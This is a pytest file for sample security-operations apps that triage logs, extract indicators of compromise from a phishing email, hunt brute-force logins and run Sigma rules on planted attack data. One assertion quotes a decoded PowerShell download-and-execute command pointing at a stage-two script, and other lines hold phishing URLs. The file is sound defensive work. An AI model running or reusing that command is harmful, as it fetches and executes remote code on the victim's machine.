"""The SOC example apps in apps/ run on the sample data and report the planted attacks."""

import json
import random

import pytest

import tb
from conftest import ROOT

APPS = ROOT / "apps"
DATA = APPS / "data"


def run_app(name, *args):
    """Run apps/<name>/main.tb with arguments; return its output as one text."""
    path = APPS / name / "main.tb"
    lines = []
    interp = tb.Interpreter(output=lines.append, input_fn=lambda prompt: "", rng=random.Random(0))
    try:
        tb.run(path.read_text(encoding="utf-8"), interpreter=interp, path=str(path), args=list(args))
    except tb.TBExit as stop:
        lines.append(f"<exit {stop.code}>")
    return "\n".join(lines)


@pytest.fixture(autouse=True)
def in_tmp(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    return tmp_path


# -- log-triage ---------------------------------------------------------------------

def test_log_triage_with_no_arguments_triages_the_samples():
    out = run_app("log-triage")
    assert "No log given" in out
    for name in ("auth.log", "access.log", "firewall.log", "windows_security.json", "windows_security.csv"):
        assert f"== {name}" in out
    assert "critical  Brute force                           203.0.113.42     22" in out
    assert "203.0.113.42 guessed a password: deploy logged in" in out
    assert "New user account created" in out and "sysupdate" in out
    assert "Password spraying on a web login  203.0.113.42" in out
    assert "Web scanner: many 404s            198.51.100.77" in out
    assert "Port scan  198.51.100.77     25" in out
    assert "203.0.113.99 guessed a password: backup logged in" in out
    assert "Decoded PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.200/stage2.ps1')" in out
    assert "Security log cleared" in out and "Administrators" in out
    assert "198.51.100.50 guessed a password: jdoe logged in" in out
    assert "Done: 294 records in 5 file(s), 16 alert(s), 11 high or critical." in out
    assert "Timeline of the high and critical alerts:" in out


def test_log_triage_one_file_and_html_report(tmp_path):
    out = run_app("log-triage", str(DATA / "access.log"), "--html", "out/triage.html")
    assert "== access.log  (apache, 114 records" in out
    assert "auth.log" not in out
    assert "HTML report saved to" in out
    page = (tmp_path / "out" / "triage.html").read_text()
    assert "<title>Log triage</title>" in page and "198.51.100.77" in page and "Password spraying" in page


def test_log_triage_handles_a_missing_file_and_help():
    out = run_app("log-triage", "nope.log")
    assert "Skipping nope.log: I couldn't find 'nope.log'" in out
    assert out.endswith("None of the logs could be read, so there is nothing to triage.\n<exit 1>")
    assert run_app("log-triage", "--bogus").endswith("<exit 2>")
    assert run_app("log-triage", "--help").endswith("<exit 0>")
    assert "--html needs a file name" in run_app("log-triage", "x.log", "--html")


def test_log_triage_quiet_log(tmp_path):
    (tmp_path / "quiet.log").write_text("Mar 12 08:02:11 web01 sshd[1]: Accepted publickey for alice from 192.0.2.10 port 1 ssh2\n")
    out = run_app("log-triage", "quiet.log")
    assert "No alerts. Nothing matched the rules." in out


def test_log_triage_own_tests_pass(capsys):
    code = tb.run_tests([str(APPS / "log-triage")])
    out = capsys.readouterr().out
    assert code == 0, out
    assert "rules_test.tb" in out and "samples_test.tb" in out and "FAIL" not in out


# -- ioc-extractor ------------------------------------------------------------------

def test_ioc_extractor_markdown_by_default():
    out = run_app("ioc-extractor")
    assert out.startswith("# IOCs in phishing_email.txt")
    assert "Found 22 IOCs: 4 IP addresses, 8 domains, 3 URLs, 3 email addresses, 1 MD5 hash, 1 SHA-1 hash, 1 SHA-256 hash, 1 CVE ID." in out
    assert "| IP address | 203[.]0[.]113[.]55 |" in out
    assert "| URL | hxxps://login-paypa1[.]account-verify[.]example[.]net/secure/verify.php?id=8812 |" in out
    assert "| email address | billing[@]paypa1-secure[.]example[.]org |" in out
    assert "| CVE ID | CVE-2023-23397 |" in out
    assert "| IP address | 2001[:]db8[:]4b[:][:]17 |" in out
    assert "20260312074102" not in out  # the Message-ID is not an email
    assert "report.pdf" not in out and "tb.py" not in out and "INV-20817.pdf" not in out


def test_ioc_extractor_json_and_raw(tmp_path):
    data = json.loads(run_app("ioc-extractor", "--json"))
    assert data["source"] == "phishing_email.txt" and data["total"] == 22 and data["defanged"] is True
    assert data["iocs"]["ips"][0] == "203[.]0[.]113[.]55"
    assert data["iocs"]["sha256"] == ["2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"]
    raw = json.loads(run_app("ioc-extractor", str(DATA / "phishing_email.txt"), "--json", "--raw"))
    assert raw["iocs"]["urls"][1] == "http://198.51.100.14/inv/INV-20817.zip"


def test_ioc_extractor_own_file_and_out(tmp_path):
    (tmp_path / "note.txt").write_text("Blocked hxxp://bad[.]example[.]com and 198.51.100.9 today.")
    out = run_app("ioc-extractor", "note.txt", "--out", "iocs.md")
    assert "Found 3 IOCs: 1 IP address, 1 domain, 1 URL." in out
    assert "| URL | hxxp://bad[.]example[.]com |" in out
    assert "198[.]51[.]100[.]9" in (tmp_path / "iocs.md").read_text()
    (tmp_path / "empty.txt").write_text("nothing to see")
    assert "No IOCs found." in run_app("ioc-extractor", "empty.txt")
    assert "<exit 1>" in run_app("ioc-extractor", "missing.txt")
    assert run_app("ioc-extractor", "--out").endswith("<exit 2>")
    assert run_app("ioc-extractor", "--nope").endswith("<exit 2>")


# -- brute-force-hunter ------------------------------------------------------------

def test_brute_force_hunter_defaults():
    out = run_app("brute-force-hunter")
    assert "Hunting for 5+ failed logins from one source within 10m." in out
    assert "3 brute-force source(s):" in out
    assert "203.0.113.42   auth.log                     22" in out
    assert "YES as deploy" in out and "YES as backup" in out and "YES as jdoe" in out
    assert "!! 203.0.113.42 guessed a password: deploy logged in at" in out
    # the slow scanner is below the threshold but still listed
    assert "Below the threshold" in out and "198.51.100.23  auth.log         3" in out


def test_brute_force_hunter_options():
    out = run_app("brute-force-hunter", str(DATA / "auth.log"), "--attempts", "30")
    assert "No brute force found." in out and "203.0.113.42   auth.log        22" in out
    out = run_app("brute-force-hunter", str(DATA / "auth.log"), "--attempts", "3", "--within", "7200")
    assert "198.51.100.23" in out.split("Below the threshold")[0] and "| no" not in out
    assert "--attempts needs a number" in run_app("brute-force-hunter", "--attempts", "many")
    assert run_app("brute-force-hunter", "--attempts").endswith("<exit 2>")
    assert run_app("brute-force-hunter", "missing.log").endswith("<exit 1>")


# -- sigma-runner -----------------------------------------------------------------

def test_sigma_runner_defaults():
    out = run_app("sigma-runner")
    assert "Loaded 4 Sigma rule(s):" in out
    assert "high    SSH Brute Force From One Address          linux/auth                11+ per ip in 300s" in out
    assert "== auth.log: 101 records, 1 alert(s)" in out
    assert "SSH Brute Force From One Address  203.0.113.42     22" in out
    assert "Web Attack Attempts" in out and "Encoded PowerShell Command Line" in out
    assert "New Local Account Created" in out and "(user helpdesk2)" in out
    assert "4 alert(s) from 4 rule(s) over 3 log(s)." in out


def test_sigma_runner_skips_broken_rules(tmp_path):
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "good.yml").write_text("title: Root login\nlevel: low\ndetection:\n  s:\n    action: login\n    user: deploy\n  condition: s\n")
    (rules / "bad.yml").write_text("title: Broken\ndetection:\n  s:\n    a|base64: x\n  condition: s\n")
    (rules / "notes.txt").write_text("not a rule")
    out = run_app("sigma-runner", str(rules), str(DATA / "auth.log"))
    assert "Skipping bad.yml: The rule \"Broken\", selection \"s\", field \"a|base64\": the |base64 modifier isn't supported yet." in out
    assert "Loaded 1 Sigma rule(s) (1 skipped):" in out
    assert "low    Root login" in out and "1 alert(s) from 1 rule(s) over 1 log(s)." in out


def test_sigma_runner_exit_codes():
    assert run_app("sigma-runner", str(DATA / "sigma"), "missing.log").endswith("<exit 1>")
    assert run_app("sigma-runner", "missing-rules").endswith("<exit 1>")
    assert run_app("sigma-runner", "--nope").endswith("<exit 2>")


def test_sigma_runner_one_rule_file():
    out = run_app("sigma-runner", str(DATA / "sigma" / "win_new_admin_user.yml"), str(DATA / "windows_security.json"))
    assert "Loaded 1 Sigma rule(s):" in out and "New Local Account Created" in out and "(user helpdesk2)" in out
